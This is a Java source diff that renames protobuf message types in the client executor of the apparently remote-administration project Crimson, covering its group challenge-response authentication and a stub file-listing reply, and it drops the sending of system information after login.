@@ -24,19 +24,18 @@ import org.slf4j.Logger;
 import com.subterranean_security.crimson.client.Client;
 import com.subterranean_security.crimson.core.net.BasicExecutor;
 import com.subterranean_security.crimson.core.net.ConnectionState;
-import com.subterranean_security.crimson.core.proto.net.Auth.GroupChallengeResult_1W;
-import com.subterranean_security.crimson.core.proto.net.Auth.GroupChallenge_RQ;
-import com.subterranean_security.crimson.core.proto.net.Auth.GroupChallenge_RS;
-import com.subterranean_security.crimson.core.proto.net.FM.FileListing_RS;
-import com.subterranean_security.crimson.core.proto.net.Gen.Group;
-import com.subterranean_security.crimson.core.proto.net.MSG.Message;
-import com.subterranean_security.crimson.core.proto.net.Stream.Param;
+import com.subterranean_security.crimson.core.proto.ClientAuth.Group;
+import com.subterranean_security.crimson.core.proto.ClientAuth.MI_GroupChallengeResult;
+import com.subterranean_security.crimson.core.proto.ClientAuth.RQ_GroupChallenge;
+import com.subterranean_security.crimson.core.proto.ClientAuth.RS_GroupChallenge;
+import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
+import com.subterranean_security.crimson.core.proto.MSG.Message;
+import com.subterranean_security.crimson.core.proto.Stream.Param;
 import com.subterranean_security.crimson.core.stream.StreamStore;
 import com.subterranean_security.crimson.core.stream.info.InfoSlave;
 import com.subterranean_security.crimson.core.util.CUtil;
 import com.subterranean_security.crimson.core.util.Crypto;
 import com.subterranean_security.crimson.core.util.IDGen;
-import com.subterranean_security.crimson.sc.SystemInfo;
 
 import io.netty.util.ReferenceCountUtil;
 
@@ -77,11 +76,11 @@ public class ClientExecutor extends BasicExecutor {
 					} catch (InterruptedException e) {
 						return;
 					}
-					if (m.hasChallengeRq()) {
+					if (m.hasRqGroupChallenge()) {
 						challenge_rq(m);
-					} else if (m.hasChallengeresult1W()) {
+					} else if (m.hasMiChallengeresult()) {
 						challengeResult_1w(m);
-					} else if (m.hasFileListingRq()) {
+					} else if (m.hasRqFileListing()) {
 						file_listing_rq(m);
 					} else if (m.hasAssign1W()) {
 						assign_1w(m);
@@ -117,16 +116,16 @@ public class ClientExecutor extends BasicExecutor {
 			log.debug("Unable to get group information");
 			return;
 		}
-		String result = Crypto.sign(m.getChallengeRq().getMagic(), group.getKey());
-		GroupChallenge_RS rs = GroupChallenge_RS.newBuilder().setResult(result).build();
-		connector.handle.write(Message.newBuilder().setId(m.getId()).setChallengeRs(rs).build());
+		String result = Crypto.sign(m.getRqGroupChallenge().getMagic(), group.getKey());
+		RS_GroupChallenge rs = RS_GroupChallenge.newBuilder().setResult(result).build();
+		connector.handle.write(Message.newBuilder().setId(m.getId()).setRsGroupChallenge(rs).build());
 	}
 
 	private void challengeResult_1w(Message m) {
 		if (connector.getState() != ConnectionState.AUTH_STAGE1) {
 			return;
 		}
-		if (!m.getChallengeresult1W().getResult()) {
+		if (!m.getMiChallengeresult().getResult()) {
 			log.debug("Authentication with server failed");
 			connector.setState(ConnectionState.CONNECTED);
 			return;
@@ -148,8 +147,8 @@ public class ClientExecutor extends BasicExecutor {
 		final int id = IDGen.get();
 
 		final String magic = CUtil.Misc.randString(64);
-		GroupChallenge_RQ rq = GroupChallenge_RQ.newBuilder().setGroupName(group.getName()).setMagic(magic).build();
-		connector.handle.write(Message.newBuilder().setId(id).setChallengeRq(rq).build());
+		RQ_GroupChallenge rq = RQ_GroupChallenge.newBuilder().setGroupName(group.getName()).setMagic(magic).build();
+		connector.handle.write(Message.newBuilder().setId(id).setRqGroupChallenge(rq).build());
 
 		new Thread(new Runnable() {
 			public void run() {
@@ -157,7 +156,7 @@ public class ClientExecutor extends BasicExecutor {
 				try {
 					Message rs = connector.cq.take(id, 7, TimeUnit.SECONDS);
 					if (rs != null) {
-						if (!rs.getChallengeRs().getResult().equals(Crypto.sign(magic, key))) {
+						if (!rs.getRsGroupChallenge().getResult().equals(Crypto.sign(magic, key))) {
 							log.info("Server challenge failed");
 							flag = false;
 						}
@@ -171,14 +170,13 @@ public class ClientExecutor extends BasicExecutor {
 					flag = false;
 				}
 
-				GroupChallengeResult_1W.Builder oneway = GroupChallengeResult_1W.newBuilder().setResult(flag);
+				MI_GroupChallengeResult.Builder oneway = MI_GroupChallengeResult.newBuilder().setResult(flag);
 				if (flag) {
-					oneway.setInitialInfo(SystemInfo.getStatic());
 					connector.setState(ConnectionState.AUTHENTICATED);
 				} else {
 					connector.setState(ConnectionState.CONNECTED);
 				}
-				connector.handle.write(Message.newBuilder().setId(id).setChallengeresult1W(oneway.build()).build());
+				connector.handle.write(Message.newBuilder().setId(id).setMiChallengeresult(oneway.build()).build());
 			}
 		}).start();
 
@@ -187,8 +185,7 @@ public class ClientExecutor extends BasicExecutor {
 	private void file_listing_rq(Message m) {
 
 		Client.connector.handle.write(Message.newBuilder()
-				.setFileListingRs(
-						FileListing_RS.newBuilder().addAllListing(null).setViewerid(m.getFileListingRq().getViewerid()))
+				.setRsFileListing(RS_FileListing.newBuilder().addAllListing(null).setVid(m.getRqFileListing().getVid()))
 				.build());
 	}
 
